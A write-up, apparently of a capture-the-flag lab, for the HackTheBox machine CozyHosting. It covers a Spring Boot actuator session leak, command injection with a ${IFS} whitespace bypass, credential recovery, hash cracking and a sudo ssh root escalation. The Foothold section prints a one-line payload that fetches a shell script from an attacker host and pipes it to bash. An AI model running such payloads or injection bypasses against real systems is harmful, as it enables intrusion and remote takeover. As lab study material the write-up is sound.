# CozyHosting — HackTheBox (Easy)

**Tags:** `#command-injection` `#spring-boot` `#gtfobins`

## Reconnaissance
- Nmap scan identified two open ports: 22 (SSH) and 80 (HTTP).

## Enumeration
- Port 80 hosted a login page; directory fuzzing with Gobuster surfaced a distinctive error page identified as belonging to Spring Boot.
- Searched for Spring Boot Actuator debugging endpoints and found `/actuator/sessions`, which leaked active user session cookies — including one belonging to an admin session.
- Using the admin session, accessed an admin page containing a form to register a host for automatic patching, requiring a hostname and username.
- Submitting the form suggested the backend used the supplied values to build an SSH command, implying the username field could be vulnerable to command injection.
- Since the username field rejected whitespace, used `${IFS}` (Internal Field Separator) as a space substitute to bypass the filter.

## Foothold
- Confirmed the command injection using Burp Suite and used it to fetch and execute a Bash reverse shell payload:
  ```bash
  curl${IFS}<attacker-ip>/shell.sh|bash
  ```
- Gained a shell on the target.

## Privilege Escalation
- Found a `.jar` file, unpacked it, and located PostgreSQL credentials inside.
- Confirmed PostgreSQL was running locally and connected using the recovered credentials.
- Found a bcrypt-hashed password for the `admin` account, identified via `hash-identifier`, and cracked it with Hashcat.
- The password belonged to the `josh` user, who was found to have `sudo` privileges to run `ssh`.
- Used the corresponding GTFOBins technique for `ssh` with `sudo` to escalate to a root shell.

## Flags
- Root shell obtained via the `ssh` sudo GTFOBins escalation.
